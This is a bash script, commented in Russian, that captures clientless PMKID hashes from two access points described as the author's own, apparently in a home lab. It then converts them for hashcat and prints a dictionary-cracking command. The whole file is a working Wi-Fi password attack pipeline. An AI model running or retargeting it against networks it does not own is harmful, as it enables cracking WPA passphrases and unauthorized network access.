#!/usr/bin/env bash
set -euo pipefail

# Clientless PMKID на своих 2.4 AP. Только USB-адаптер, без 5 GHz / wlp4s0.
MON_IF="${MON_IF:-wlp199s0f3u1mon}"
PHY_IF="${PHY_IF:-wlp199s0f3u1}"
OUTDIR="${OUTDIR:-/home/darkrogua/pmkid-lab}"
LOG="${LOG:-$OUTDIR/pmkid.log}"
# минуты захвата; 0 = не ставить --tot
TOT_MIN="${TOT_MIN:-8}"
# каналы 2.4: Beeline ch1, rsk3off ch2 (суффикс a = NL80211_BAND_2GHZ)
CHANNELS="${CHANNELS:-1a,2a}"
TARGET="${TARGET:-all}" # all | beeline | rsk3off

BSSID_BEELINE="74:9d:79:55:54:1a"
BSSID_RSK="00:31:92:cf:fd:1e"

if [[ "${EUID}" -ne 0 ]]; then
  echo "Запусти: sudo $0" >&2
  exit 1
fi

HCXDUMP="$(command -v hcxdumptool || true)"
HCXPCAP="$(command -v hcxpcapngtool || true)"
[[ -n "$HCXDUMP" ]] || HCXDUMP="/nix/store/32pvdpz6drvq2pn0pl6rmj5a199445rl-hcxdumptool-7.1.2/bin/hcxdumptool"
[[ -x "$HCXDUMP" ]] || { echo "нет hcxdumptool" >&2; exit 1; }
[[ -n "$HCXPCAP" ]] || { echo "нет hcxpcapngtool" >&2; exit 1; }

IFACE="$MON_IF"
if ! ip link show "$IFACE" &>/dev/null; then
  IFACE="$PHY_IF"
fi
if ! ip link show "$IFACE" &>/dev/null; then
  echo "нет интерфейса $MON_IF / $PHY_IF" >&2
  exit 1
fi

mkdir -p "$OUTDIR"
log() { echo "[$(date -Iseconds)] $*" | tee -a "$LOG"; }

bssids=()
case "$TARGET" in
  all)
    bssids+=("$BSSID_BEELINE" "$BSSID_RSK")
    ;;
  beeline) bssids+=("$BSSID_BEELINE") ;;
  rsk3off) bssids+=("$BSSID_RSK") ;;
  *) echo "TARGET: all | beeline | rsk3off" >&2; exit 1 ;;
esac

bpf_expr="wlan addr3 ffffffffffff"
for mac in "${bssids[@]}"; do
  compact="${mac//:/}"
  bpf_expr+=" or wlan addr3 ${compact} or wlan addr1 ${compact} or wlan addr2 ${compact}"
done

BPF="$OUTDIR/targets.bpf"
log "=== BPF: $bpf_expr ==="
"$HCXDUMP" --bpfc="$bpf_expr" >"$BPF"

stamp="$(date +%Y%m%d-%H%M%S)"
PCAP="$OUTDIR/pmkid-${TARGET}-${stamp}.pcapng"
HASH="$OUTDIR/pmkid-${TARGET}-${stamp}.22000"
ESSIDS="$OUTDIR/essids-${stamp}.txt"

# не трогаем чужие сети; не гоняем клиентов (их нет); без deauth-спама
hcx_args=(
  -i "$IFACE"
  -w "$PCAP"
  -c "$CHANNELS"
  -t 8
  --bpf="$BPF"
  --rds=0
  --rdt
  --m2max=0
  --disable_disassociation
  --errormax=50
  --watchdogmax=180
)

if [[ "$TOT_MIN" != "0" ]]; then
  hcx_args+=(--tot="$TOT_MIN")
fi

log "=== hcxdumptool $IFACE ch=$CHANNELS tot=${TOT_MIN}m target=$TARGET ==="
log "pcap: $PCAP"

set +e
"$HCXDUMP" "${hcx_args[@]}" 2>&1 | tee -a "$LOG"
rc=${PIPESTATUS[0]}
set -e
log "hcxdumptool exit=$rc"

if [[ ! -s "$PCAP" ]]; then
  log "pcap пустой — PMKID не записан"
  exit "$rc"
fi

log "=== hcxpcapngtool → $HASH ==="
"$HCXPCAP" -o "$HASH" -E "$ESSIDS" "$PCAP" 2>&1 | tee -a "$LOG" || true

if [[ -s "$HASH" ]]; then
  log "хеши:"
  cat "$HASH" | tee -a "$LOG"
  log "дальше: hashcat -m 22000 $HASH <словарь>"
else
  log "хешей нет: AP не отдал PMKID (колонка P) — для этой прошивки clientless PMKID недоступен"
fi
